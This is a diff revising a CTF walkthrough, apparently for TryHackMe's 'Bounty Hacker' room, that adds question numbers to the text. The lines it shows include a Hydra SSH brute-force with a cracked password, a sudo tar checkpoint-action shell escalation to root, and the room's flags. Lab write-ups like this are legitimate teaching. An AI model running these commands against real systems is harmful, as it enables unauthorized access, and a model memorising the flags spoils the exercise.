@@ -24,7 +24,7 @@ PORT   STATE SERVICE VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to ::ffff:10.8.5.11
+|      Connected to ::ffff:xxx
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -143,7 +143,7 @@ r3ddr@g0N
 ReDSynd1ca7e
 ```
 
-Through the second file we get a username 'lin':
+Through the second file we get a username 'lin' which might be used to answer **Q3**:
 ```bash
 $ cat task.txt 
 1.) Protect Vicious.
@@ -152,7 +152,7 @@ $ cat task.txt
 -lin
 ```
 ## Initial access
-We have everything we need to try and attack SSH using hydra:
+We have everything we need to try and attack SSH using hydra, which also answers **Q4**:
 ```bash
 $ hydra -l lin -P locks.txt 10.10.162.62 ssh                           
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -166,7 +166,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-10 10:02:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-10 10:02:29
 ```
 
-And we´ve got: 'login: lin' and 'password: RedDr4gonSynd1cat3'. Now just login to SSH:
+And we´ve got: 'login: lin' and 'password: RedDr4gonSynd1cat3'. So answer Q5 and login to SSH:
 ```bash
 $ ssh lin@10.10.162.62           
 The authenticity of host '10.10.162.62 (10.10.162.62)' can't be established.
@@ -191,12 +191,12 @@ lin@bountyhacker:~/Desktop$ cat user.txt
 THM{CR1M3_SyNd1C4T3}
 ```
 ## Privilege Escalation
-We immediately got the user flag. Now we start with privilege escalation to become root.
+We immediately got the user flag for **Q6**. Now we start with privilege escalation to become root.
 I usually start by checking ```sudo -l``` and got lucky.
-We can abuse the tar functionality of setting checkpoints. the ```checkpoint=1```creates the checkpoint before reading the Nth record. In our case, the checkpoint is done immediately. The ```--checkpoint-action=exec=/bin/sh``` is an action done within that checkpoint. In our case, we create a shell and since the process is executed with sudo, we get root access, hurray!
-So just find the root directory and then the flag.
+We can abuse the tar functionality of setting checkpoints. the ```checkpoint=1``` creates the checkpoint before reading the Nth record. In our case, the checkpoint is done immediately. The ```--checkpoint-action=exec=/bin/sh``` is an action done within that checkpoint. In our case, we create a shell and since the process is executed with sudo, we get root access, hurray!
+So just find the root directory and then the flag for **Q7**.
 
-```bash
+```shell
 lin@bountyhacker:~/Desktop$ sudo -l
 [sudo] password for lin: 
 Matching Defaults entries for lin on bountyhacker:
@@ -205,7 +205,7 @@ Matching Defaults entries for lin on bountyhacker:
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-tar: Removing leading `/' from member names
+tar: Removing leading `/` from member names
 # ls
 user.txt
 # whoami
